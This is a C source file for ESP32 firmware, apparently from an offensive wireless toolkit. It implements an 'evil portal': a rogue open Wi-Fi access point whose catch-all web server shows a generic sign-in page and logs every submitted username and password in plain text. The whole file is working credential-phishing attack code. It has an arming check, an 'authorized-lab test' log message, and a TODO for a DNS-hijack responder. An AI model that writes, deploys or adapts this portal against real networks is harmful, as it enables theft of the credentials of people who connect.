// LxveOS evil-portal (see lxveos_evilportal.h). Rogue OPEN SoftAP + captive credential-capture portal.
// OFFENSIVE-TX: starting the AP is an emission, so start() refuses unless lxveos_arm_can_emit() is true.
// The Wi-Fi bring-up tolerates the stack already being up (the recon path lazily inits STA) — it adds an AP
// netif and switches to AP mode. v1 serves the portal to any HTTP request hitting the gateway; a DNS-hijack
// responder for automatic captive-portal pop-up is a follow-up (TODO below).
#include "lxveos_evilportal.h"

#include <ctype.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>

#include "esp_event.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"

#include "lxveos_arm.h"

static const char *TAG = "lxveos_evilportal";

static httpd_handle_t s_http;
static esp_netif_t   *s_ap_netif;
static uint32_t       s_captures;
static bool           s_running;

// Generic, unbranded "network sign-in" page — served for every request (captive-portal catch-all). Posts
// credentials to /login. Deliberately impersonates no specific brand.
static const char PORTAL_HTML[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<title>Network Login</title></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Network sign-in required</h2><p>Please sign in to continue.</p>"
    "<form method=POST action=\"/login\">"
    "<p><input name=username placeholder=\"Username or email\" style=\"width:100%;padding:8px\"></p>"
    "<p><input name=password type=password placeholder=Password style=\"width:100%;padding:8px\"></p>"
    "<p><button type=submit style=\"width:100%;padding:10px\">Sign in</button></p>"
    "</form></body></html>";

static const char DONE_HTML[] =
    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\"></head>"
    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
    "<h2>Connecting&hellip;</h2><p>Please wait while your connection is established.</p></body></html>";

// Decode application/x-www-form-urlencoded text ('+' -> space, %XX -> byte) into a bounded, NUL-terminated
// destination.
static void url_decode(const char *src, char *dst, size_t dstsz)
{
    size_t di = 0;
    for (size_t si = 0; src[si] && di + 1 < dstsz; si++) {
        char c = src[si];
        if (c == '+') {
            dst[di++] = ' ';
        } else if (c == '%' && isxdigit((unsigned char)src[si + 1]) && isxdigit((unsigned char)src[si + 2])) {
            char h[3] = {src[si + 1], src[si + 2], '\0'};
            dst[di++] = (char)strtol(h, NULL, 16);
            si += 2;
        } else {
            dst[di++] = c;
        }
    }
    dst[di] = '\0';
}

// Extract form field `key` from a urlencoded `body` into `out` (URL-decoded, bounded). Returns false if the
// key is not present.
static bool form_field(const char *body, const char *key, char *out, size_t outsz)
{
    size_t klen = strlen(key);
    for (const char *p = body; p && *p;) {
        const char *amp = strchr(p, '&');
        if (strncmp(p, key, klen) == 0 && p[klen] == '=') {
            const char *val = p + klen + 1;
            size_t vlen = amp ? (size_t)(amp - val) : strlen(val);
            char raw[160];
            if (vlen >= sizeof(raw)) {
                vlen = sizeof(raw) - 1;
            }
            memcpy(raw, val, vlen);
            raw[vlen] = '\0';
            url_decode(raw, out, outsz);
            return true;
        }
        if (!amp) {
            break;
        }
        p = amp + 1;
    }
    return false;
}

// Replace control bytes so a crafted submission can't garble the console log.
static void sanitize(char *s)
{
    for (; *s; s++) {
        unsigned char c = (unsigned char)*s;
        if (c < 0x20 || c == 0x7f) {
            *s = '.';
        }
    }
}

// Any GET -> the login page (captive-portal catch-all via the wildcard match fn).
static esp_err_t portal_get_handler(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
}

// POST /login -> capture the submitted credentials (logged + counted), then show a benign "connecting" page.
static esp_err_t login_post_handler(httpd_req_t *req)
{
    char body[512];
    size_t total = req->content_len;
    if (total > sizeof(body) - 1) {
        total = sizeof(body) - 1;
    }
    size_t received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, body + received, total - received);
        if (r <= 0) {
            if (r == HTTPD_SOCK_ERR_TIMEOUT) {
                continue;
            }
            return ESP_FAIL;
        }
        received += (size_t)r;
    }
    body[received] = '\0';

    char user[160] = {0};
    char pass[160] = {0};
    form_field(body, "username", user, sizeof(user));
    form_field(body, "password", pass, sizeof(pass));
    sanitize(user);
    sanitize(pass);
    s_captures++;
    ESP_LOGW(TAG, "captured credential #%u: user='%s' pass='%s'", (unsigned)s_captures, user, pass);

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, DONE_HTML, HTTPD_RESP_USE_STRLEN);
}

esp_err_t lxveos_evilportal_start(const char *ssid)
{
    if (s_running) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!lxveos_arm_can_emit()) {
        return ESP_ERR_NOT_ALLOWED;  // not armed / offensive TX compiled out
    }
    if (ssid == NULL || ssid[0] == '\0') {
        return ESP_ERR_INVALID_ARG;
    }

    esp_netif_init();  // idempotent if the recon path already inited networking
    esp_err_t e = esp_event_loop_create_default();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }
    if (s_ap_netif == NULL) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
        if (s_ap_netif == NULL) {
            return ESP_FAIL;
        }
    }
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    e = esp_wifi_init(&cfg);
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }

    wifi_config_t ap = {0};
    size_t n = strlen(ssid);
    if (n > sizeof(ap.ap.ssid)) {
        n = sizeof(ap.ap.ssid);
    }
    memcpy(ap.ap.ssid, ssid, n);
    ap.ap.ssid_len = (uint8_t)n;
    ap.ap.channel = 1;
    ap.ap.max_connection = 4;
    ap.ap.authmode = WIFI_AUTH_OPEN;
    ap.ap.beacon_interval = 100;

    if ((e = esp_wifi_set_mode(WIFI_MODE_AP)) != ESP_OK) {
        return e;
    }
    if ((e = esp_wifi_set_config(WIFI_IF_AP, &ap)) != ESP_OK) {
        return e;
    }
    e = esp_wifi_start();
    if (e != ESP_OK && e != ESP_ERR_INVALID_STATE) {
        return e;
    }

    httpd_config_t hc = HTTPD_DEFAULT_CONFIG();
    hc.uri_match_fn = httpd_uri_match_wildcard;
    hc.lru_purge_enable = true;
    hc.max_uri_handlers = 8;
    if ((e = httpd_start(&s_http, &hc)) != ESP_OK) {
        s_http = NULL;
        return e;
    }
    httpd_uri_t login_uri = {
        .uri = "/login", .method = HTTP_POST, .handler = login_post_handler, .user_ctx = NULL};
    httpd_uri_t portal_uri = {
        .uri = "/*", .method = HTTP_GET, .handler = portal_get_handler, .user_ctx = NULL};
    httpd_register_uri_handler(s_http, &login_uri);
    httpd_register_uri_handler(s_http, &portal_uri);

    // TODO(HW-validate + follow-up): a UDP:53 DNS-hijack responder (answer every query with 192.168.4.1) so
    // client captive-portal detection auto-opens the page. v1 serves the portal at the gateway on demand.
    s_captures = 0;
    s_running = true;
    ESP_LOGW(TAG, "evil-portal up: OPEN AP '%s' (ch1), captive login at 192.168.4.1 — authorized-lab test",
             ssid);
    return ESP_OK;
}

esp_err_t lxveos_evilportal_stop(void)
{
    if (s_http != NULL) {
        httpd_stop(s_http);
        s_http = NULL;
    }
    if (s_running) {
        esp_wifi_stop();
        ESP_LOGW(TAG, "evil-portal stopped (%u credential(s) captured)", (unsigned)s_captures);
    }
    s_running = false;
    return ESP_OK;
}

bool lxveos_evilportal_running(void)
{
    return s_running;
}

uint32_t lxveos_evilportal_captures(void)
{
    return s_captures;
}
